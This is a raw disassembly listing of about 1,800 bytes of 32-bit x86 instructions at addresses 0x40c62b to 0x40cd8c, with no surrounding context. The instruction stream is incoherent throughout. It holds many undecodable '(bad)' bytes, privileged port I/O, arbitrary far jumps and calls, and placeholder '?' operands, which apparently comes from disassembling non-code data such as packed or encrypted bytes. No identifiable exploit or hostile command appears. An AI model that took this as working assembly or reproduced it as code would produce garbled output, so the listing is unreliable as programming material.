  40c62b:	out    dx,eax
  40c62c:	mov    edx,0x15492e5
  40c631:	xor    cl,BYTE PTR [edi-0x9]
  40c634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c635:	adc    bl,dl
  40c637:	(bad)  
  40c639:	gs jecxz 0x40c5cb
  40c63c:	sub    edx,esp
  40c63e:	fiadd  WORD PTR [esi-0x7a]
  40c641:	fs popa 
  40c643:	sbb    ah,BYTE PTR [edi]
  40c645:	xor    bh,ah
  40c647:	sbb    ah,dh
  40c649:	add    DWORD PTR [ebp-0x7b8d4a65],esp
  40c64f:	(bad)  
  40c650:	out    dx,al
  40c651:	stc    
  40c652:	mov    WORD PTR [edx+0x3b],fs
  40c655:	div    DWORD PTR [edx-0x5b]
  40c658:	shl    DWORD PTR [esi],1
  40c65a:	repz imul esi,ebx,0x6f0d8052
  40c661:	les    edi,FWORD PTR [ecx]
  40c663:	inc    edi
  40c664:	aad    0x4b
  40c666:	mov    dl,bh
  40c668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c669:	push   0x708c6d03
  40c66e:	sbb    ecx,DWORD PTR [edx-0xd1ae71]
  40c674:	shr    DWORD PTR [eax],1
  40c676:	sbb    al,0x2c
  40c678:	pop    edx
  40c679:	mov    ds:0x18c3b999,al
  40c67e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c67f:	mov    esi,0x71d3cb2e
  40c684:	or     ebp,DWORD PTR [esi-0x22]
  40c687:	or     eax,0xc61bcab2
  40c68c:	and    BYTE PTR [ecx],bl
  40c68e:	dec    al
  40c690:	jmp    0x4ddc:0x67156b55
  40c697:	adc    ebx,ebx
  40c699:	js     0x40c677
  40c69b:	mov    ah,0xfb
  40c69d:	push   edi
  40c69e:	fcomp  QWORD PTR [edi+0x4d]
  40c6a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6a2:	or     DWORD PTR [ebx-0x7e],edi
  40c6a5:	ror    DWORD PTR [edx+0x72],0xcd
  40c6a9:	ret    0xffe3
  40c6ac:	fcmovnbe st,st(3)
  40c6ae:	and    ebp,DWORD PTR [edx-0x17141610]
  40c6b4:	xor    eax,0x3350f0f3
  40c6b9:	sahf   
  40c6ba:	scas   al,BYTE PTR es:[edi]
  40c6bb:	xor    DWORD PTR [eax-0x653f7e7],esp
  40c6c1:	pop    ebp
  40c6c2:	stos   DWORD PTR es:[edi],eax
  40c6c3:	mov    ebp,0xa41d1214
  40c6c8:	test   BYTE PTR [ebx+0x3d8eab8c],ah
  40c6ce:	lahf   
  40c6cf:	jle    0x40c6f8
  40c6d1:	mov    eax,0xf383b211
  40c6d6:	xchg   al,cl
  40c6d8:	pushf  
  40c6d9:	push   esp
  40c6da:	in     eax,dx
  40c6db:	and    eax,0x751e7035
  40c6e0:	adc    DWORD PTR [edi+0x38b3d072],ebx
  40c6e6:	aam    0x5f
  40c6e8:	pop    ebx
  40c6e9:	inc    esi
  40c6ea:	daa    
  40c6eb:	out    dx,eax
  40c6ec:	pushf  
  40c6ed:	adc    eax,0xc7e2f36a
  40c6f2:	and    edi,DWORD PTR [ecx+0x3f]
  40c6f5:	and    DWORD PTR [ebx+0x5f51b795],eax
  40c6fb:	mov    eax,0x42a143c5
  40c700:	push   cs
  40c701:	test   ch,bh
  40c703:	or     dh,0x9d
  40c706:	loopne 0x40c786
  40c708:	xchg   ah,bl
  40c70a:	aas    
  40c70b:	or     DWORD PTR [eax-0x441404c6],esi
  40c711:	or     DWORD PTR [ebp+0x570af224],edi
  40c717:	xchg   esi,eax
  40c718:	es or  al,0x25
  40c71b:	sbb    eax,0x8a883f63
  40c720:	test   BYTE PTR [edi],cl
  40c722:	imul   ebp,edx,0xa63e992f
  40c728:	inc    edi
  40c729:	xchg   edi,eax
  40c72a:	test   eax,0x320be274
  40c72f:	ja     0x40c742
  40c731:	int    0xd6
  40c733:	xor    al,0xf4
  40c735:	jmp    0x96e7:0xcca1d6c5
  40c73c:	fwait
  40c73d:	shr    DWORD PTR [esi-0x7680db48],1
  40c743:	cs jg  0x40c708
  40c746:	stc    
  40c747:	sub    eax,0xb4e573c9
  40c74c:	ficom  WORD PTR [edi-0x37277097]
  40c752:	fwait
  40c753:	mov    bl,0x93
  40c755:	ror    ecx,cl
  40c757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c758:	lock xchg esp,ecx
  40c75b:	jl     0x40c6f6
  40c75d:	pop    ebx
  40c75e:	popa   
  40c75f:	test   DWORD PTR [edx],esi
  40c761:	out    0x70,eax
  40c763:	(bad)  
  40c765:	clc    
  40c766:	xchg   BYTE PTR [edi-0x227cad1],ah
  40c76c:	iret   
  40c76d:	sub    BYTE PTR [edx],dl
  40c76f:	pushf  
  40c770:	jbe    0x40c773
  40c772:	dec    esp
  40c773:	xor    ebp,DWORD PTR [edi+0x68]
  40c776:	repz mov ds:0xa833eff0,eax
  40c77c:	gs pop ss
  40c77e:	and    esi,DWORD PTR [esp+edi*2-0x709b7413]
  40c785:	and    esp,esp
  40c787:	bound  ebp,QWORD PTR [ebx-0x71]
  40c78a:	call   eax
  40c78c:	jae    0x40c76b
  40c78e:	mov    al,ds:0x2b077775
  40c793:	pop    esp
  40c794:	dec    ebp
  40c795:	dec    ebx
  40c796:	out    0xf1,eax
  40c798:	test   eax,0xe60d2108
  40c79d:	out    dx,eax
  40c79e:	pop    eax
  40c79f:	arpl   WORD PTR [ebx+0x6ed7ce2a],si
  40c7a5:	aad    0x6a
  40c7a7:	ins    DWORD PTR es:[edi],dx
  40c7a8:	ret    0xc7e0
  40c7ab:	mov    ecx,0x924f929a
  40c7b0:	hlt    
  40c7b1:	ret    
  40c7b2:	or     BYTE PTR [eax],ah
  40c7b4:	and    DWORD PTR [esi+0x7e],esp
  40c7b7:	mov    ss,ecx
  40c7b9:	pop    ebp
  40c7ba:	jmp    0xf28c:0xbbd8eb89
  40c7c1:	xchg   edx,eax
  40c7c2:	add    esp,DWORD PTR ds:0x163e6722
  40c7c8:	dec    ebp
  40c7c9:	mov    ds:0xd6cba35d,al
  40c7ce:	mov    bh,0xab
  40c7d0:	std    
  40c7d1:	rdpmc  
  40c7d3:	jns    0x40c84b
  40c7d5:	in     al,dx
  40c7d6:	pushf  
  40c7d7:	mov    ds:0xe99fc7c0,eax
  40c7dc:	push   esi
  40c7dd:	pop    ebx
  40c7de:	es xchg ebx,eax
  40c7e0:	pusha  
  40c7e1:	sti    
  40c7e2:	scas   al,BYTE PTR es:[edi]
  40c7e3:	popa   
  40c7e4:	push   0x98194ad2
  40c7e9:	stos   DWORD PTR es:[edi],eax
  40c7ea:	sbb    al,0x79
  40c7ec:	or     DWORD PTR ss:[edx],esp
  40c7ef:	sbb    BYTE PTR [eax],bh
  40c7f1:	mov    DWORD PTR [ebp+0x2b2b63f7],esp
  40c7f7:	ins    DWORD PTR es:[edi],dx
  40c7f8:	jmp    0x38762415
  40c7fd:	or     al,0x57
  40c7ff:	sub    dh,dl
  40c801:	mov    ah,0xc7
  40c803:	retf   0x651b
  40c806:	retf   0x9f96
  40c809:	test   BYTE PTR ds:0x74ee34a4,0xf2
  40c810:	jmp    0x6a24:0xdd19ab30
  40c817:	pop    esp
  40c818:	mov    es,WORD PTR [eax-0x535bcada]
  40c81e:	and    DWORD PTR [ecx+0x45276ef8],esp
  40c824:	mov    al,0x1
  40c826:	ret    
  40c827:	shl    DWORD PTR [eax+ebp*8+0x65],1
  40c82b:	leave  
  40c82c:	lea    ebp,[edi+0x38]
  40c82f:	ja     0x40c7fb
  40c831:	lea    edx,[ebx-0x3a665a15]
  40c837:	fidiv  DWORD PTR [eax-0x3e3e3966]
  40c83d:	mov    ebp,0x450101f3
  40c842:	cmp    bh,ch
  40c844:	daa    
  40c845:	fwait
  40c846:	lds    ecx,FWORD PTR [edx-0x12]
  40c849:	dec    ebp
  40c84a:	inc    esi
  40c84b:	movups XMMWORD PTR [ebx],xmm6
  40c84e:	test   BYTE PTR [esi-0x3c],cl
  40c851:	mov    DWORD PTR [ebx],esi
  40c853:	sub    BYTE PTR [edx],bh
  40c855:	mov    bh,0xc5
  40c857:	out    dx,eax
  40c858:	pop    ebx
  40c859:	push   ecx
  40c85a:	scas   al,BYTE PTR es:[edi]
  40c85b:	inc    edx
  40c85c:	mov    bh,0x1f
  40c85e:	push   es
  40c85f:	mov    ?,esp
  40c861:	pop    ecx
  40c862:	ins    BYTE PTR es:[edi],dx
  40c863:	add    eax,0x2a9466
  40c868:	mov    ah,0x7b
  40c86a:	and    BYTE PTR [edx],al
  40c86c:	loopne 0x40c884
  40c86e:	hlt    
  40c86f:	std    
  40c870:	rcr    BYTE PTR [ebx+0x5e02c249],1
  40c876:	sti    
  40c877:	in     al,dx
  40c878:	push   es
  40c879:	cmp    DWORD PTR [edx-0xd],esp
  40c87c:	and    dh,BYTE PTR [esi]
  40c87e:	call   0x25b8d2b9
  40c883:	bswap  ebx
  40c885:	aaa    
  40c886:	pop    esi
  40c887:	push   ebp
  40c888:	aaa    
  40c889:	jecxz  0x40c8fb
  40c88b:	(bad)  
  40c88c:	or     eax,0xf2450410
  40c891:	and    DWORD PTR [ebx+0x41e027cd],ebx
  40c897:	jmp    0x40c8af
  40c899:	sub    bh,BYTE PTR [esi-0x28]
  40c89c:	in     eax,dx
  40c89d:	jle    0x40c8b1
  40c89f:	pop    edx
  40c8a0:	xor    BYTE PTR [ecx+0x683203e3],ah
  40c8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8a7:	xchg   BYTE PTR [edx],dl
  40c8a9:	fadd   DWORD PTR [ebx]
  40c8ab:	mov    ch,0xef
  40c8ad:	stos   DWORD PTR es:[edi],eax
  40c8ae:	inc    ebx
  40c8af:	loope  0x40c899
  40c8b1:	fidivr WORD PTR [esp+edx*2+0x16]
  40c8b5:	fisubr DWORD PTR [edi+0x3d]
  40c8b8:	xor    DWORD PTR [ecx+0x11de4e17],ebp
  40c8be:	ss stos BYTE PTR es:[edi],al
  40c8c0:	es (bad) 
  40c8c2:	retf   
  40c8c3:	xchg   ebp,eax
  40c8c4:	test   BYTE PTR [ebx],bh
  40c8c6:	and    cl,BYTE PTR [ecx+0x23]
  40c8c9:	jne    0x40c8fa
  40c8cb:	or     eax,0xd5bc50a7
  40c8d0:	jns    0x40c889
  40c8d2:	fnstcw WORD PTR [eax]
  40c8d4:	adc    ebx,ecx
  40c8d6:	inc    edx
  40c8d7:	or     dh,dh
  40c8d9:	pop    DWORD PTR [ebp-0x36]
  40c8dc:	xchg   edx,eax
  40c8dd:	rcl    bl,1
  40c8df:	cli    
  40c8e0:	call   0x863bc2f3
  40c8e5:	(bad)  
  40c8e6:	(bad)  [esi+0x1e]
  40c8e9:	mov    edx,DWORD PTR [eax+edx*4]
  40c8ec:	jge    0x40c886
  40c8ee:	outs   dx,BYTE PTR ds:[esi]
  40c8ef:	nop
  40c8f0:	neg    BYTE PTR [ebp-0x6f]
  40c8f3:	cmp    DWORD PTR [eax],esp
  40c8f5:	jne    0x40c8f2
  40c8f7:	mov    dl,0xf5
  40c8f9:	lock outs dx,DWORD PTR ds:[esi]
  40c8fb:	xchg   edi,eax
  40c8fc:	xor    DWORD PTR [ecx+0x4962c20d],edx
  40c902:	ficomp DWORD PTR [edx]
  40c904:	mov    ds,WORD PTR [eax]
  40c906:	rcl    edi,1
  40c908:	ret    
  40c909:	dec    eax
  40c90a:	shr    ch,cl
  40c90c:	iret   
  40c90d:	xchg   edx,eax
  40c90e:	ss test eax,0xd033cac2
  40c914:	mov    DWORD PTR [edx+0x7a49712e],0x12dbc533
  40c91e:	mov    al,0x62
  40c920:	xor    eax,0x2119a22d
  40c925:	inc    esi
  40c927:	push   edx
  40c928:	popf   
  40c929:	pop    ebp
  40c92a:	xor    eax,DWORD PTR ds:0x860e905e
  40c930:	and    al,BYTE PTR [eax]
  40c932:	mov    bl,0x19
  40c934:	add    dh,bh
  40c936:	shl    BYTE PTR [esi-0x7e],cl
  40c939:	add    dh,BYTE PTR [edx+0x10c5fdf5]
  40c93f:	mov    WORD PTR [ebx],gs
  40c941:	inc    ebp
  40c942:	cmp    ch,BYTE PTR ds:0x14cf2129
  40c948:	cs dec esi
  40c94a:	out    0x6b,al
  40c94c:	dec    edi
  40c94d:	aad    0x74
  40c94f:	(bad)  
  40c950:	jo     0x40c99d
  40c952:	mov    edi,0x70f76026
  40c957:	inc    esi
  40c958:	(bad)  
  40c959:	jge    0x40c986
  40c95b:	and    eax,0x2f26539f
  40c960:	push   es
  40c961:	(bad)  
  40c962:	sti    
  40c963:	jo     0x40c928
  40c965:	sahf   
  40c966:	sub    DWORD PTR [ebp-0x1a],eax
  40c969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c96a:	mul    dh
  40c96c:	sbb    al,0x0
  40c96e:	mov    es:0x971e932d,al
  40c974:	jmp    0x67fc:0x5e6ddad7
  40c97b:	out    0xaa,eax
  40c97d:	daa    
  40c97e:	xchg   ecx,eax
  40c97f:	in     al,dx
  40c980:	and    ebx,DWORD PTR [ebp+0x5f]
  40c983:	adc    eax,0xbdc4eb3a
  40c988:	pop    ss
  40c989:	out    0xc9,eax
  40c98b:	(bad)  
  40c98c:	in     eax,dx
  40c98d:	jecxz  0x40c93e
  40c98f:	aaa    
  40c990:	and    edi,DWORD PTR [esi]
  40c992:	arpl   WORD PTR [ebp-0x53],si
  40c995:	inc    ecx
  40c996:	and    dl,BYTE PTR [ecx-0x2a]
  40c999:	jne    0x40c993
  40c99b:	xor    eax,0x291e3b41
  40c9a0:	mov    esi,0xa6051bd5
  40c9a5:	push   edi
  40c9a6:	cmp    al,0xe6
  40c9a8:	add    eax,0x9fd19315
  40c9ad:	push   ecx
  40c9ae:	cs (bad) 
  40c9b0:	sbb    eax,0x9f39b2cb
  40c9b5:	add    esi,DWORD PTR [edx]
  40c9b7:	es inc ebx
  40c9b9:	popa   
  40c9ba:	out    dx,eax
  40c9bb:	(bad)  
  40c9bc:	jnp    0x40ca35
  40c9be:	cmp    ah,BYTE PTR [esi-0x2d8cb5de]
  40c9c4:	jmp    0x40c9c9
  40c9c6:	sbb    bl,ch
  40c9c8:	jae    0x40ca33
  40c9ca:	xor    DWORD PTR [ecx],eax
  40c9cc:	adc    ch,bl
  40c9ce:	mov    ebx,0x7b6fc1ef
  40c9d3:	sub    bh,ah
  40c9d5:	xor    bh,BYTE PTR [ebp+0x6e]
  40c9d8:	es add ebp,ebx
  40c9db:	stc    
  40c9dc:	retf   
  40c9dd:	test   DWORD PTR [esi],esp
  40c9df:	xchg   esi,eax
  40c9e0:	sbb    DWORD PTR [ecx],esi
  40c9e2:	mov    ds:0xc0d72125,al
  40c9e7:	jle    0x40c9e4
  40c9e9:	lods   al,BYTE PTR ds:[esi]
  40c9ea:	mov    dl,0x2a
  40c9ec:	jg     0x40c9ff
  40c9ee:	sub    ch,BYTE PTR [eax-0x704ee404]
  40c9f4:	mov    ecx,0x909f2305
  40c9f9:	sar    DWORD PTR [edx-0x110402c7],0x45
  40ca00:	loop   0x40ca72
  40ca02:	inc    edx
  40ca03:	clc    
  40ca04:	test   al,0xc3
  40ca06:	ja     0x40ca03
  40ca08:	mov    WORD PTR [esi-0x137b3b82],ds
  40ca0e:	xchg   edx,eax
  40ca0f:	call   0x2435:0xa6e6471e
  40ca16:	inc    esp
  40ca17:	dec    edi
  40ca18:	mov    eax,0xbee7e068
  40ca1d:	ins    BYTE PTR es:[edi],dx
  40ca1e:	jle    0x40c9ac
  40ca20:	sbb    DWORD PTR [ebp+0x7],edx
  40ca23:	sbb    DWORD PTR [eax],esp
  40ca25:	div    DWORD PTR [esp+eiz*4+0x64f90987]
  40ca2c:	inc    ecx
  40ca2d:	jo     0x40ca7c
  40ca2f:	fsubr  st,st(7)
  40ca31:	push   cs
  40ca32:	(bad)  
  40ca33:	js     0x40c9ca
  40ca35:	sahf   
  40ca36:	jge    0x40ca12
  40ca38:	cld    
  40ca39:	or     al,0x1b
  40ca3b:	out    dx,al
  40ca3c:	outs   dx,BYTE PTR ds:[esi]
  40ca3d:	sti    
  40ca3e:	pop    edx
  40ca3f:	pushf  
  40ca40:	sub    al,BYTE PTR [ebx+edi*2+0x19]
  40ca44:	push   ecx
  40ca45:	das    
  40ca46:	xchg   BYTE PTR [edx],al
  40ca48:	sti    
  40ca49:	inc    ebp
  40ca4a:	outs   dx,DWORD PTR ds:[esi]
  40ca4b:	iret   
  40ca4c:	jecxz  0x40c9fc
  40ca4e:	and    ecx,esi
  40ca50:	xchg   ebx,eax
  40ca51:	xlat   BYTE PTR ds:[ebx]
  40ca52:	cmc    
  40ca53:	jne    0x40ca2c
  40ca55:	mov    edx,ebp
  40ca57:	jle    0x40cad7
  40ca59:	les    edx,FWORD PTR [edx]
  40ca5b:	mov    dh,0x67
  40ca5d:	js     0x40ca28
  40ca5f:	lods   eax,DWORD PTR ds:[esi]
  40ca60:	ja     0x40ca94
  40ca62:	pop    ebp
  40ca63:	and    BYTE PTR [ebx-0x57151406],bl
  40ca69:	dec    esp
  40ca6a:	(bad)  [edx-0x3d]
  40ca6d:	sti    
  40ca6e:	dec    ebp
  40ca6f:	jmp    0x158f:0x496b7a1e
  40ca76:	or     eax,0x4755327e
  40ca7b:	xor    DWORD PTR [ebx],ebp
  40ca7d:	retf   
  40ca7e:	rcl    DWORD PTR [esi-0x56],cl
  40ca81:	lods   al,BYTE PTR ds:[esi]
  40ca82:	inc    esp
  40ca83:	dec    eax
  40ca84:	and    eax,0xd3c03458
  40ca89:	int3   
  40ca8a:	xchg   ebp,eax
  40ca8b:	ret    0x7a80
  40ca8e:	xor    dl,BYTE PTR [edi+0x3b97afff]
  40ca94:	and    eax,0x5a63c33
  40ca99:	ins    DWORD PTR es:[edi],dx
  40ca9a:	mov    ch,0x6
  40ca9c:	inc    ecx
  40ca9d:	adc    BYTE PTR [ecx],bl
  40ca9f:	cld    
  40caa0:	mov    edx,0xbff92b34
  40caa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caa6:	push   es
  40caa7:	pop    esi
  40caa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caa9:	test   eax,0x189f35d7
  40caae:	mov    WORD PTR ds:0xb53f93f2,es
  40cab4:	jmp    0x40ca59
  40cab6:	inc    ebx
  40cab7:	mov    WORD PTR [ebp+0x3701c18d],cs
  40cabd:	push   eax
  40cabe:	cs (bad) 
  40cac0:	push   eax
  40cac1:	rol    edi,0xf9
  40cac4:	ret    
  40cac5:	bound  eax,QWORD PTR [edx-0x4e]
  40cac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cac9:	mov    ebx,es
  40cacb:	xor    dl,al
  40cacd:	adc    DWORD PTR [ebp-0x5b],ebp
  40cad0:	jg     0x40ca5b
  40cad2:	sub    BYTE PTR ds:0xe4484424,bh
  40cad8:	out    0x43,eax
  40cada:	es mov dl,0xcb
  40cadd:	cwde   
  40cade:	fwait
  40cadf:	sahf   
  40cae0:	add    eax,0x28e71fbc
  40cae5:	mov    WORD PTR [edx-0x375474fc],ax
  40caec:	das    
  40caed:	pop    ebp
  40caee:	jns    0x40cac7
  40caf0:	xor    BYTE PTR [ebx-0x12],dl
  40caf3:	or     al,0xb3
  40caf5:	sti    
  40caf6:	or     bl,BYTE PTR [esi+0x15]
  40caf9:	push   esi
  40cafa:	mov    bl,0x3b
  40cafc:	loop   0x40caf2
  40cafe:	rcl    cl,0xbc
  40cb01:	(bad)  
  40cb03:	or     al,0xab
  40cb05:	mov    ecx,0x75db42d2
  40cb0a:	dec    esp
  40cb0b:	inc    ecx
  40cb0c:	test   BYTE PTR [ebx+0x6d16ee9e],cl
  40cb12:	lods   eax,DWORD PTR ds:[esi]
  40cb13:	add    BYTE PTR [eax+esi*1],ch
  40cb16:	les    esp,FWORD PTR [ecx]
  40cb18:	cmp    esp,DWORD PTR [edi-0x2b]
  40cb1b:	rcr    ebp,cl
  40cb1d:	fdivp  st(6),st
  40cb1f:	out    dx,al
  40cb20:	loope  0x40cb9f
  40cb22:	test   eax,0xb0e97d90
  40cb27:	scas   eax,DWORD PTR es:[edi]
  40cb28:	mov    bh,0x61
  40cb2a:	jp     0x40cb1f
  40cb2c:	adc    eax,ebp
  40cb2e:	int    0xad
  40cb30:	cmp    ebp,DWORD PTR [esi+0x27]
  40cb33:	xchg   DWORD PTR [edi],ebp
  40cb35:	fld    TBYTE PTR [edx]
  40cb37:	fdivr  DWORD PTR [eax+0x33b2eb69]
  40cb3d:	sti    
  40cb3e:	and    BYTE PTR [edx-0xe],cl
  40cb41:	or     DWORD PTR [eax],edi
  40cb43:	jmp    0x40cb47
  40cb45:	mov    ecx,0x13f648d7
  40cb4a:	shl    dh,0xcb
  40cb4d:	cmp    cl,cl
  40cb4f:	into   
  40cb50:	lock push ss
  40cb52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb53:	mov    bl,0xc5
  40cb55:	fwait
  40cb56:	sub    cl,BYTE PTR [edx+0x2a]
  40cb59:	mov    ecx,0xf76a7fa1
  40cb5e:	mov    edi,0x28dceaf7
  40cb63:	jns    0x40cbe1
  40cb65:	data16 in al,dx
  40cb67:	popa   
  40cb68:	push   esi
  40cb69:	mov    fs,WORD PTR [edi-0x3]
  40cb6c:	or     al,0x58
  40cb6e:	mov    al,0x48
  40cb70:	sbb    eax,0x6dfbed9f
  40cb75:	pop    ds
  40cb76:	out    dx,al
  40cb77:	dec    ebx
  40cb78:	inc    ecx
  40cb79:	cmp    al,0x29
  40cb7b:	cmp    DWORD PTR [ebx-0xa],0xffffff80
  40cb7f:	push   esi
  40cb80:	xor    cl,BYTE PTR [ebp-0x16]
  40cb83:	pop    edi
  40cb84:	(bad)  [ecx+0x1c]
  40cb87:	imul   esi,DWORD PTR [edx-0x3d73a2c2],0xc86560b7
  40cb91:	sub    dh,BYTE PTR [edx+0x4806fbf7]
  40cb97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb99:	push   eax
  40cb9a:	imul   ecx,DWORD PTR [ecx-0x4f1ee585],0xffffffe8
  40cba1:	cmp    eax,0xc780d38d
  40cba6:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40cba8:	mov    edx,0x5dd6e396
  40cbad:	pop    ebp
  40cbae:	shl    BYTE PTR [ebx-0x1],cl
  40cbb1:	push   cs
  40cbb2:	jg     0x40cba7
  40cbb4:	inc    edi
  40cbb5:	xchg   DWORD PTR [ebx-0x3b],ebp
  40cbb8:	lock xchg edi,eax
  40cbba:	and    eax,0xb106e790
  40cbbf:	test   al,0xcf
  40cbc1:	sub    BYTE PTR [eax+0x8],0xd4
  40cbc5:	dec    ebx
  40cbc6:	fbld   TBYTE PTR [esi]
  40cbc8:	jmp    0x40cb5c
  40cbca:	(bad)  
  40cbcb:	shl    BYTE PTR [ebx],1
  40cbcd:	rol    esi,1
  40cbcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbd0:	test   ebp,ebx
  40cbd2:	jmp    0x40cbe0
  40cbd4:	xor    bh,0xfb
  40cbd7:	xchg   edi,eax
  40cbd8:	sbb    bh,ch
  40cbda:	test   DWORD PTR [ebp+edi*1-0x51383ba6],0xda61b3ac
  40cbe5:	addr16 (bad) 
  40cbe7:	gs xchg esi,eax
  40cbe9:	inc    ecx
  40cbea:	sub    al,BYTE PTR [edi-0x46]
  40cbed:	out    0xdc,al
  40cbef:	fidiv  WORD PTR [esp+eax*2+0x2f431b7b]
  40cbf6:	xchg   esi,eax
  40cbf7:	xchg   bl,bh
  40cbf9:	mov    WORD PTR [esi-0x1f],?
  40cbfc:	push   ds
  40cbfd:	pop    edi
  40cbfe:	jge    0x40cb98
  40cc00:	loop   0x40cb9c
  40cc02:	adc    eax,0xc14f6785
  40cc07:	test   eax,0x9c1a7d6d
  40cc0c:	dec    ebx
  40cc0d:	lds    esp,FWORD PTR [edx-0x4cf7a756]
  40cc13:	(bad)  
  40cc14:	sti    
  40cc15:	or     DWORD PTR [edi-0x404ef3ee],0x56aa6d04
  40cc1f:	outs   dx,DWORD PTR ds:[esi]
  40cc20:	cdq    
  40cc21:	jg     0x40cc6e
  40cc23:	sub    ah,BYTE PTR gs:0x6c049a56
  40cc2a:	dec    edi
  40cc2b:	jmp    0x2acf536c
  40cc30:	mov    eax,0xd1fb7a7a
  40cc35:	or     eax,0x7deabebb
  40cc3a:	adc    DWORD PTR [edi+esi*1+0x43e7f85b],0x296a03c0
  40cc45:	add    ecx,DWORD PTR [esi+0x5d]
  40cc48:	jnp    0x40cc7b
  40cc4a:	loop   0x40cc5d
  40cc4c:	and    DWORD PTR [eax-0x8],edx
  40cc4f:	and    edi,edi
  40cc51:	jg     0x40ccc5
  40cc53:	sbb    DWORD PTR [ebx-0x498a905d],esi
  40cc59:	jge    0x40cbec
  40cc5b:	cmp    eax,0xe253075a
  40cc60:	pop    edi
  40cc61:	sbb    DWORD PTR [edi],ebp
  40cc63:	shr    DWORD PTR [ecx-0x9133621],1
  40cc69:	fist   DWORD PTR [ebx]
  40cc6b:	mov    cl,0x2c
  40cc6d:	xchg   esp,eax
  40cc6e:	push   edx
  40cc6f:	dec    edi
  40cc70:	nop
  40cc71:	dec    ebp
  40cc72:	pop    ds
  40cc73:	xchg   BYTE PTR [esi],cl
  40cc75:	pop    es
  40cc76:	shl    DWORD PTR [ebp+ebp*4-0x47],0x1a
  40cc7b:	lods   al,BYTE PTR ds:[esi]
  40cc7c:	xor    al,0x65
  40cc7e:	loop   0x40ccea
  40cc80:	mov    WORD PTR [edx+0x6481de85],ds
  40cc86:	and    BYTE PTR [esp+ecx*8+0x15],bl
  40cc8a:	rcl    DWORD PTR [eax+ebx*1-0x1e964fad],cl
  40cc91:	and    edi,DWORD PTR [ebx]
  40cc93:	mov    bh,0xd3
  40cc95:	cdq    
  40cc96:	aad    0xf1
  40cc98:	mov    ebx,0xf5676c86
  40cc9d:	(bad)  
  40cc9e:	or     al,0x2e
  40cca0:	push   ecx
  40cca1:	popf   
  40cca2:	mov    esp,0xc060d139
  40cca7:	call   0x7263:0xe9ab9c70
  40ccae:	adc    DWORD PTR [esi+eax*4-0x1c],esp
  40ccb2:	add    al,0xd9
  40ccb4:	sti    
  40ccb5:	pop    eax
  40ccb6:	dec    ebx
  40ccb7:	mov    ebx,0xe2038ae5
  40ccbc:	xor    dl,BYTE PTR [edi]
  40ccbe:	mov    bh,0xa0
  40ccc0:	fisttp DWORD PTR [edi+0x54f9e0e8]
  40ccc6:	(bad)  
  40ccc8:	mov    ds:0x57aea50b,al
  40cccd:	xor    dh,BYTE PTR [edi+0x28bb120f]
  40ccd3:	jne    0x40cd53
  40ccd5:	mov    eax,ds:0x25b0fe71
  40ccda:	sub    eax,0x148b26a0
  40ccdf:	in     eax,0xbe
  40cce1:	ins    DWORD PTR es:[edi],dx
  40cce2:	inc    ebx
  40cce3:	xor    bl,bl
  40cce5:	jne    0x40cce0
  40cce7:	jge    0x40cc73
  40cce9:	stc    
  40ccea:	add    eax,0xec9f20b0
  40ccef:	(bad)  
  40ccf1:	lahf   
  40ccf2:	shl    BYTE PTR [eax+0x3a],1
  40ccf5:	push   ds
  40ccf6:	lds    ecx,FWORD PTR [ebx]
  40ccf8:	mov    WORD PTR [ebp+0x2f],ss
  40ccfb:	mov    ebp,0x66c5aef1
  40cd00:	pushf  
  40cd01:	push   cs
  40cd02:	jb     0x40cd53
  40cd04:	mov    bh,0x8a
  40cd06:	xchg   BYTE PTR [ebx-0x4449cac2],ah
  40cd0c:	(bad)  
  40cd0d:	mov    ebx,0x8c362757
  40cd12:	leave  
  40cd13:	fcom   DWORD PTR [eax+0x3a82121f]
  40cd19:	xchg   edi,eax
  40cd1a:	dec    ecx
  40cd1b:	xchg   ecx,eax
  40cd1c:	jge    0x40ccf9
  40cd1e:	mov    bl,BYTE PTR [esi-0x24]
  40cd21:	mul    BYTE PTR [esi]
  40cd23:	jae    0x40cd3e
  40cd25:	(bad)  
  40cd27:	icebp  
  40cd28:	(bad)  
  40cd2a:	(bad)  
  40cd2b:	rcr    DWORD PTR [esi+0x2f2def67],1
  40cd31:	push   cs
  40cd32:	aaa    
  40cd33:	test   DWORD PTR [esp+ebp*1],edx
  40cd36:	mov    eax,ds:0xfef17e0c
  40cd3b:	jecxz  0x40cdb1
  40cd3d:	add    ebp,DWORD PTR [edi+0x54]
  40cd40:	push   0x2abdeb96
  40cd45:	sti    
  40cd46:	or     DWORD PTR [ebp-0x5c080ecb],ebp
  40cd4c:	jmp    0xe5ae:0x9833856f
  40cd53:	push   edi
  40cd54:	ins    DWORD PTR es:[edi],dx
  40cd55:	dec    ecx
  40cd56:	mov    ah,0xc5
  40cd58:	sub    dl,BYTE PTR [edx]
  40cd5a:	sub    esp,DWORD PTR [eax+0x68]
  40cd5d:	jl     0x40cd31
  40cd5f:	call   FWORD PTR [eax]
  40cd61:	adc    al,0xb5
  40cd63:	fdivr  DWORD PTR [ecx+esi*4+0x1081b084]
  40cd6a:	(bad)  
  40cd6b:	(bad)  [ebx]
  40cd6d:	fld    QWORD PTR [edx]
  40cd6f:	test   al,0x8f
  40cd71:	gs scas al,BYTE PTR es:[edi]
  40cd73:	lods   eax,DWORD PTR ds:[esi]
  40cd74:	xor    cl,BYTE PTR [edi+0xc4f82e8]
  40cd7a:	loop   0x40cdf4
  40cd7c:	add    esp,esp
  40cd7e:	je     0x40cd59
  40cd80:	mov    eax,0xb9df40d8
  40cd85:	dec    esi
  40cd86:	or     ebx,DWORD PTR [edi-0x9984bc4]
  40cd8c:	jmp    0x40ce04
